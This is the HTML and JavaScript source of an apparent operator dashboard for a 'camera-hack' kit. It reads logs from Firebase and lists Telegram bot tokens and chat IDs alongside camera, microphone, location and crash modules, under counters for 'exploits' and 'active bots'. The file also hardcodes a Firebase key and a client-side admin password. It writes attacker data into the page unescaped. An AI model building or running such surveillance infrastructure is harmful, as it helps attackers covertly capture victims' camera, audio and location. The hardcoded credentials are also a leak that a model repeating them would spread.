<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MR_MOMIN_🌍 | Admin Command Center</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ff41; --bg: #000500; --panel: rgba(0, 20, 0, 0.9); --border: #004400; }
        * { box-sizing: border-box; font-family: 'Fira Code', monospace; }
        body { margin: 0; background: var(--bg); color: var(--neon); min-height: 100vh; overflow-x: hidden; }

        /* Login Screen */
        #login-screen {
            position: fixed; inset: 0; z-index: 100; background: var(--bg);
            display: flex; justify-content: center; align-items: center;
        }
        .login-card {
            width: 320px; padding: 40px; border: 2px solid var(--neon);
            border-radius: 15px; text-align: center; background: var(--panel);
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
        }
        .login-card h2 { font-size: 18px; margin-bottom: 20px; color: #fff; text-shadow: 0 0 10px var(--neon); }
        .login-card input {
            width: 100%; padding: 12px; margin-bottom: 20px; background: #000;
            border: 1px solid var(--border); border-radius: 5px; color: var(--neon);
            text-align: center; outline: none;
        }
        .login-btn {
            width: 100%; padding: 12px; background: var(--neon); color: #000;
            font-weight: bold; border: none; border-radius: 5px; cursor: pointer;
            transition: 0.3s;
        }

        /* Main Dashboard */
        #dashboard { display: none; padding: 20px; max-width: 1200px; margin: auto; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 2px solid var(--border); padding-bottom: 20px; margin-bottom: 30px;
        }
        .header h1 { margin: 0; font-size: 28px; color: #fff; text-shadow: 0 0 10px var(--neon); }
        
        .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card {
            background: var(--panel); border: 1px solid var(--border); padding: 20px;
            border-radius: 10px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
        }
        .stat-card h3 { font-size: 12px; opacity: 0.6; margin: 0; }
        .stat-card p { font-size: 24px; font-weight: bold; margin: 10px 0 0; color: #fff; }

        /* Table Style */
        .table-container { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #002200; padding: 15px; text-align: left; font-size: 13px; color: #fff; border-bottom: 2px solid var(--border); }
        td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 12px; vertical-align: middle; }
        tr:hover { background: rgba(0, 255, 65, 0.05); }

        .feature-tag {
            background: #003300; color: var(--neon); padding: 3px 8px;
            border-radius: 4px; font-size: 10px; margin-right: 5px; border: 1px solid var(--neon);
        }
        .copy-btn {
            background: none; border: 1px solid var(--neon); color: var(--neon);
            padding: 4px 8px; font-size: 10px; border-radius: 3px; cursor: pointer;
        }
        .copy-btn:hover { background: var(--neon); color: #000; }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
    </style>
</head>
<body>

<div id="login-screen">
    <div class="login-card">
        <h2>ADMIN ACCESS</h2>
        <p style="font-size: 10px; margin-bottom: 15px; opacity: 0.6;">MR_MOMIN_🌍 COMMAND CENTER</p>
        <input type="password" id="admin-pass" placeholder="ENTER SECRET KEY">
        <button class="login-btn" onclick="verifyAccess()">AUTHORIZE</button>
    </div>
</div>

<div id="dashboard">
    <div class="header">
        <h1>MR_MOMIN_🌍</h1>
        <div style="text-align: right;">
            <p id="status-text" style="font-size: 10px; color: var(--neon);">● SERVER ONLINE</p>
            <button onclick="location.reload()" class="copy-btn">REFRESH DATABASE</button>
        </div>
    </div>

    <div class="stats-row">
        <div class="stat-card">
            <h3>TOTAL EXPLOITS</h3>
            <p id="total-count">0</p>
        </div>
        <div class="stat-card">
            <h3>ACTIVE BOTS</h3>
            <p id="bot-count">0</p>
        </div>
        <div class="stat-card">
            <h3>LAST UPDATE</h3>
            <p id="last-time" style="font-size: 12px; margin-top: 20px;">--:--:--</p>
        </div>
    </div>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>TIMESTAMP</th>
                    <th>BOT TOKEN</th>
                    <th>CHAT ID</th>
                    <th>MODULES</th>
                    <th>ACTION</th>
                </tr>
            </thead>
            <tbody id="log-body">
                <!-- Data will load here -->
            </tbody>
        </table>
    </div>
</div>

<script>
    // Firebase Configuration
    const firebaseConfig = {
        apiKey: "AIzaSyCiAEFoHUdaaJNJr0PnweGOZ-N7zi438c0",
        authDomain: "camera-hack-mr-momin.firebaseapp.com",
        projectId: "camera-hack-mr-momin",
        storageBucket: "camera-hack-mr-momin.firebasestorage.app",
        messagingSenderId: "637134050647",
        appId: "1:637134050647:web:86c90c894a13be2fd75a12"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    function verifyAccess() {
        const pass = document.getElementById('admin-pass').value;
        if(pass === "momin123") {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            startLiveUpdates();
        } else {
            alert("ACCESS DENIED: INVALID KEY");
        }
    }

    function startLiveUpdates() {
        db.collection("logs").orderBy("time", "desc").onSnapshot((snapshot) => {
            const tbody = document.getElementById('log-body');
            tbody.innerHTML = "";
            
            let uniqueBots = new Set();
            let count = 0;

            snapshot.forEach((doc) => {
                const data = doc.data();
                count++;
                uniqueBots.add(data.token);

                const row = `
                    <tr>
                        <td style="color: #888;">${data.time}</td>
                        <td title="${data.token}">${data.token.substring(0, 15)}...</td>
                        <td><code>${data.chatid}</code></td>
                        <td>${formatModules(data.features)}</td>
                        <td>
                            <button class="copy-btn" onclick="copyText('${data.token}')">TOKEN</button>
                            <button class="copy-btn" onclick="copyText('${data.chatid}')">ID</button>
                        </td>
                    </tr>
                `;
                tbody.innerHTML += row;
            });

            // Update Stats
            document.getElementById('total-count').innerText = count;
            document.getElementById('bot-count').innerText = uniqueBots.size;
            document.getElementById('last-time').innerText = new Date().toLocaleTimeString();
        });
    }

    function formatModules(f) {
        if(!f) return "NONE";
        let tags = "";
        if(f.includes('C')) tags += '<span class="feature-tag">CAM</span>';
        if(f.includes('M')) tags += '<span class="feature-tag">MIC</span>';
        if(f.includes('L')) tags += '<span class="feature-tag">LOC</span>';
        if(f.includes('X')) tags += '<span class="feature-tag">CRASH</span>';
        return tags;
    }

    function copyText(text) {
        navigator.clipboard.writeText(text);
        alert("COPIED TO CLIPBOARD!");
    }
</script>
</body>
</html>
